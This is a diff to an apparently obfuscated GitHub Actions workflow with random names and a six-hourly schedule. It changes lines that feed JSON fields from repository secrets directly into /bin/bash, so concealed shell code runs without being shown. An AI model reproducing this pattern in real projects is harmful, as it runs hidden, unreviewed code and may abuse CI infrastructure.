@@ -2,7 +2,7 @@ name: lujingxi3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 4/6 * * *'
+    - cron: '10 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,11 +10,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: lujingxi3456
         env:
-          n9: ${{ secrets.n9 }}
+          xapk88: ${{ secrets.xapk88 }}
         run: |
-          echo $n9 | jq -r .e7975 | /bin/bash
-          echo $jg205 | jq -r .cjrdo12556 | /bin/bash
-          echo $quj97263 | jq -r .rv6302 | /bin/bash
-          echo $ygu02944 | jq -r .uin5907 | /bin/bash
-          echo $vqib8967 | jq -r .hibl70566 | /bin/bash
+          echo $xapk88 | jq -r .pz172 | /bin/bash
+          echo $za4975 | jq -r .sh9 | /bin/bash
+          echo $htva00 | jq -r .osl545 | /bin/bash
+          echo $gef5539 | jq -r .r18175 | /bin/bash
+          echo $kfljb52 | jq -r .llsfa06587 | /bin/bash
+          echo $fjnm2 | jq -r .s1474 | /bin/bash
+          echo $h66 | jq -r .lrr4264 | /bin/bash
+          echo $kucp802 | jq -r .oa62455 | /bin/bash
+          echo $uv656 | jq -r .luf46 | /bin/bash
+          echo $angtp14 | jq -r .z28980 | /bin/bash
+          echo $axro9 | jq -r .ohr0631 | /bin/bash
 
